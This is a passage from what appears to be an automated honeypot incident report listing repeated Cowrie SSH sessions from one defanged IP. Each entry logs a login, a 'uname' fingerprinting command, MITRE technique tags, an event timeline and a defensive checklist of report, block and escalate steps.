| `2026-07-19 09:49:11` | `cowrie.log.closed` |
| `2026-07-19 09:49:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7909c1f0e51

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:49 |
| **Last Seen** | 2026-07-19 09:49 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:49:10` | `cowrie.session.connect` |
| `2026-07-19 09:49:11` | `cowrie.client.version` |
| `2026-07-19 09:49:11` | `cowrie.client.kex` |
| `2026-07-19 09:49:20` | `cowrie.login.success` |
| `2026-07-19 09:49:24` | `cowrie.session.params` |
| `2026-07-19 09:49:24` | `cowrie.command.input` |
| `2026-07-19 09:49:25` | `cowrie.log.closed` |
| `2026-07-19 09:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5070c2ee63e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:49 |
| **Last Seen** | 2026-07-19 09:49 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:49:22` | `cowrie.session.connect` |
| `2026-07-19 09:49:24` | `cowrie.client.version` |
| `2026-07-19 09:49:24` | `cowrie.client.kex` |
| `2026-07-19 09:49:32` | `cowrie.login.success` |
| `2026-07-19 09:49:38` | `cowrie.session.params` |
| `2026-07-19 09:49:38` | `cowrie.command.input` |
| `2026-07-19 09:49:41` | `cowrie.log.closed` |
| `2026-07-19 09:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4942ecce2d6f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:49 |
| **Last Seen** | 2026-07-19 09:49 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:49:33` | `cowrie.session.connect` |
| `2026-07-19 09:49:35` | `cowrie.client.version` |
| `2026-07-19 09:49:35` | `cowrie.client.kex` |
| `2026-07-19 09:49:44` | `cowrie.login.success` |
| `2026-07-19 09:49:52` | `cowrie.session.params` |
| `2026-07-19 09:49:52` | `cowrie.command.input` |
| `2026-07-19 09:49:55` | `cowrie.log.closed` |
| `2026-07-19 09:49:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b27cd600c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:49 |
| **Last Seen** | 2026-07-19 09:50 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:49:42` | `cowrie.session.connect` |
| `2026-07-19 09:49:46` | `cowrie.client.version` |
| `2026-07-19 09:49:46` | `cowrie.client.kex` |
| `2026-07-19 09:49:55` | `cowrie.login.success` |
| `2026-07-19 09:50:02` | `cowrie.session.params` |
| `2026-07-19 09:50:02` | `cowrie.command.input` |
| `2026-07-19 09:50:03` | `cowrie.log.closed` |
| `2026-07-19 09:50:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-984cec0a25fb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:50 |
| **Last Seen** | 2026-07-19 09:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:50:02` | `cowrie.session.connect` |
| `2026-07-19 09:50:03` | `cowrie.client.version` |
| `2026-07-19 09:50:03` | `cowrie.client.kex` |
| `2026-07-19 09:50:10` | `cowrie.login.success` |
| `2026-07-19 09:50:11` | `cowrie.session.params` |
| `2026-07-19 09:50:11` | `cowrie.command.input` |
| `2026-07-19 09:50:11` | `cowrie.log.closed` |
| `2026-07-19 09:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d64c0bb4abad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:50 |
| **Last Seen** | 2026-07-19 09:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:50:15` | `cowrie.session.connect` |
| `2026-07-19 09:50:16` | `cowrie.client.version` |
| `2026-07-19 09:50:16` | `cowrie.client.kex` |
| `2026-07-19 09:50:20` | `cowrie.login.success` |
| `2026-07-19 09:50:21` | `cowrie.session.params` |
| `2026-07-19 09:50:21` | `cowrie.command.input` |
| `2026-07-19 09:50:22` | `cowrie.log.closed` |
| `2026-07-19 09:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77aba2761c80

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:50 |
| **Last Seen** | 2026-07-19 09:50 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:50:29` | `cowrie.session.connect` |
| `2026-07-19 09:50:30` | `cowrie.client.version` |
| `2026-07-19 09:50:30` | `cowrie.client.kex` |
| `2026-07-19 09:50:35` | `cowrie.login.success` |
| `2026-07-19 09:50:39` | `cowrie.session.params` |
| `2026-07-19 09:50:39` | `cowrie.command.input` |
| `2026-07-19 09:50:42` | `cowrie.log.closed` |
| `2026-07-19 09:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a51ff9a0a2f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:50 |
| **Last Seen** | 2026-07-19 09:50 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:50:41` | `cowrie.session.connect` |
| `2026-07-19 09:50:42` | `cowrie.client.version` |
| `2026-07-19 09:50:42` | `cowrie.client.kex` |
| `2026-07-19 09:50:50` | `cowrie.login.success` |
| `2026-07-19 09:50:53` | `cowrie.session.params` |
| `2026-07-19 09:50:53` | `cowrie.command.input` |
| `2026-07-19 09:50:55` | `cowrie.log.closed` |
| `2026-07-19 09:50:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0acfd8a59cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:50 |
| **Last Seen** | 2026-07-19 09:51 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:50:54` | `cowrie.session.connect` |
| `2026-07-19 09:50:55` | `cowrie.client.version` |
| `2026-07-19 09:50:55` | `cowrie.client.kex` |
| `2026-07-19 09:50:59` | `cowrie.login.success` |
| `2026-07-19 09:51:04` | `cowrie.session.params` |
| `2026-07-19 09:51:04` | `cowrie.command.input` |
| `2026-07-19 09:51:07` | `cowrie.log.closed` |
| `2026-07-19 09:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b23dee5b3f03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:51 |
| **Last Seen** | 2026-07-19 09:51 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:51:04` | `cowrie.session.connect` |
| `2026-07-19 09:51:07` | `cowrie.client.version` |
| `2026-07-19 09:51:07` | `cowrie.client.kex` |
| `2026-07-19 09:51:15` | `cowrie.login.success` |
| `2026-07-19 09:51:20` | `cowrie.session.params` |
| `2026-07-19 09:51:20` | `cowrie.command.input` |
| `2026-07-19 09:51:22` | `cowrie.log.closed` |
| `2026-07-19 09:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf928036710

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:51 |
| **Last Seen** | 2026-07-19 09:51 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:51:18` | `cowrie.session.connect` |
| `2026-07-19 09:51:20` | `cowrie.client.version` |
| `2026-07-19 09:51:20` | `cowrie.client.kex` |
| `2026-07-19 09:51:32` | `cowrie.login.success` |
| `2026-07-19 09:51:42` | `cowrie.session.params` |
| `2026-07-19 09:51:42` | `cowrie.command.input` |
| `2026-07-19 09:51:46` | `cowrie.log.closed` |
| `2026-07-19 09:51:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5214f9f35c2e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:51 |
| **Last Seen** | 2026-07-19 09:51 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:51:30` | `cowrie.session.connect` |
| `2026-07-19 09:51:32` | `cowrie.client.version` |
| `2026-07-19 09:51:32` | `cowrie.client.kex` |
| `2026-07-19 09:51:46` | `cowrie.login.success` |
| `2026-07-19 09:51:55` | `cowrie.session.params` |
| `2026-07-19 09:51:55` | `cowrie.command.input` |
| `2026-07-19 09:51:57` | `cowrie.log.closed` |
| `2026-07-19 09:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8817b6421b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:51 |
| **Last Seen** | 2026-07-19 09:52 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:51:41` | `cowrie.session.connect` |
| `2026-07-19 09:51:44` | `cowrie.client.version` |
| `2026-07-19 09:51:44` | `cowrie.client.kex` |
| `2026-07-19 09:51:57` | `cowrie.login.success` |
| `2026-07-19 09:52:05` | `cowrie.session.params` |
| `2026-07-19 09:52:05` | `cowrie.command.input` |
| `2026-07-19 09:52:08` | `cowrie.log.closed` |
| `2026-07-19 09:52:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e150bf35215

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:51 |
| **Last Seen** | 2026-07-19 09:52 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:51:56` | `cowrie.session.connect` |
| `2026-07-19 09:52:02` | `cowrie.client.version` |
| `2026-07-19 09:52:02` | `cowrie.client.kex` |
| `2026-07-19 09:52:14` | `cowrie.login.success` |
| `2026-07-19 09:52:21` | `cowrie.session.params` |
| `2026-07-19 09:52:21` | `cowrie.command.input` |
| `2026-07-19 09:52:24` | `cowrie.log.closed` |
| `2026-07-19 09:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a736c72537

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:52 |
| **Last Seen** | 2026-07-19 09:52 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:52:11` | `cowrie.session.connect` |
| `2026-07-19 09:52:13` | `cowrie.client.version` |
| `2026-07-19 09:52:13` | `cowrie.client.kex` |
| `2026-07-19 09:52:26` | `cowrie.login.success` |
| `2026-07-19 09:52:35` | `cowrie.session.params` |
| `2026-07-19 09:52:35` | `cowrie.command.input` |
| `2026-07-19 09:52:36` | `cowrie.log.closed` |
| `2026-07-19 09:52:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60395b883df4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:52 |
| **Last Seen** | 2026-07-19 09:52 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:52:22` | `cowrie.session.connect` |
| `2026-07-19 09:52:25` | `cowrie.client.version` |
| `2026-07-19 09:52:25` | `cowrie.client.kex` |
| `2026-07-19 09:52:37` | `cowrie.login.success` |
| `2026-07-19 09:52:40` | `cowrie.session.params` |
| `2026-07-19 09:52:40` | `cowrie.command.input` |
| `2026-07-19 09:52:41` | `cowrie.log.closed` |
| `2026-07-19 09:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdac10d40190

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:52 |
| **Last Seen** | 2026-07-19 09:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:52:35` | `cowrie.session.connect` |
| `2026-07-19 09:52:37` | `cowrie.client.version` |
| `2026-07-19 09:52:37` | `cowrie.client.kex` |
| `2026-07-19 09:52:42` | `cowrie.login.success` |
| `2026-07-19 09:52:44` | `cowrie.session.params` |
| `2026-07-19 09:52:44` | `cowrie.command.input` |
| `2026-07-19 09:52:45` | `cowrie.log.closed` |
| `2026-07-19 09:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a553e8845fe5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:52 |
| **Last Seen** | 2026-07-19 09:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:52:45` | `cowrie.session.connect` |
| `2026-07-19 09:52:46` | `cowrie.client.version` |
| `2026-07-19 09:52:46` | `cowrie.client.kex` |
| `2026-07-19 09:52:51` | `cowrie.login.success` |
| `2026-07-19 09:52:53` | `cowrie.session.params` |
| `2026-07-19 09:52:53` | `cowrie.command.input` |
| `2026-07-19 09:52:55` | `cowrie.log.closed` |
| `2026-07-19 09:52:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bedda2e77279

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:52 |
| **Last Seen** | 2026-07-19 09:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:52:56` | `cowrie.session.connect` |
| `2026-07-19 09:52:56` | `cowrie.client.version` |
| `2026-07-19 09:52:56` | `cowrie.client.kex` |
| `2026-07-19 09:53:02` | `cowrie.login.success` |
| `2026-07-19 09:53:04` | `cowrie.session.params` |
| `2026-07-19 09:53:04` | `cowrie.command.input` |
| `2026-07-19 09:53:05` | `cowrie.log.closed` |
| `2026-07-19 09:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe1371ff3b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:53 |
| **Last Seen** | 2026-07-19 09:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:53:05` | `cowrie.session.connect` |
| `2026-07-19 09:53:06` | `cowrie.client.version` |
| `2026-07-19 09:53:06` | `cowrie.client.kex` |
| `2026-07-19 09:53:09` | `cowrie.login.success` |
| `2026-07-19 09:53:10` | `cowrie.session.params` |
| `2026-07-19 09:53:10` | `cowrie.command.input` |
| `2026-07-19 09:53:10` | `cowrie.log.closed` |
| `2026-07-19 09:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e0e8975d4c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:53 |
| **Last Seen** | 2026-07-19 09:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:53:15` | `cowrie.session.connect` |
| `2026-07-19 09:53:15` | `cowrie.client.version` |
| `2026-07-19 09:53:15` | `cowrie.client.kex` |
| `2026-07-19 09:53:16` | `cowrie.login.success` |
| `2026-07-19 09:53:18` | `cowrie.session.params` |
| `2026-07-19 09:53:18` | `cowrie.command.input` |
| `2026-07-19 09:53:18` | `cowrie.log.closed` |
| `2026-07-19 09:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10702191464c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:53 |
| **Last Seen** | 2026-07-19 09:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:53:24` | `cowrie.session.connect` |
| `2026-07-19 09:53:24` | `cowrie.client.version` |
| `2026-07-19 09:53:24` | `cowrie.client.kex` |
| `2026-07-19 09:53:25` | `cowrie.login.success` |
| `2026-07-19 09:53:26` | `cowrie.session.params` |
| `2026-07-19 09:53:26` | `cowrie.command.input` |
| `2026-07-19 09:53:27` | `cowrie.log.closed` |
| `2026-07-19 09:53:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff9a04c679aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:53 |
| **Last Seen** | 2026-07-19 09:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:53:32` | `cowrie.session.connect` |
| `2026-07-19 09:53:32` | `cowrie.client.version` |
| `2026-07-19 09:53:32` | `cowrie.client.kex` |
| `2026-07-19 09:53:33` | `cowrie.login.success` |
| `2026-07-19 09:53:35` | `cowrie.session.params` |
| `2026-07-19 09:53:35` | `cowrie.command.input` |
| `2026-07-19 09:53:35` | `cowrie.log.closed` |
| `2026-07-19 09:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f57be750485

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:53 |
| **Last Seen** | 2026-07-19 09:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:53:39` | `cowrie.session.connect` |
| `2026-07-19 09:53:40` | `cowrie.client.version` |
| `2026-07-19 09:53:40` | `cowrie.client.kex` |
| `2026-07-19 09:53:41` | `cowrie.login.success` |
| `2026-07-19 09:53:43` | `cowrie.session.params` |
| `2026-07-19 09:53:43` | `cowrie.command.input` |
| `2026-07-19 09:53:43` | `cowrie.log.closed` |
| `2026-07-19 09:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ee6e90b8a4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:53 |
| **Last Seen** | 2026-07-19 09:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:53:46` | `cowrie.session.connect` |
| `2026-07-19 09:53:46` | `cowrie.client.version` |
| `2026-07-19 09:53:46` | `cowrie.client.kex` |
| `2026-07-19 09:53:50` | `cowrie.login.success` |
| `2026-07-19 09:53:52` | `cowrie.session.params` |
| `2026-07-19 09:53:52` | `cowrie.command.input` |
| `2026-07-19 09:53:52` | `cowrie.log.closed` |
| `2026-07-19 09:53:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc2227f8146

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:53 |
| **Last Seen** | 2026-07-19 09:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

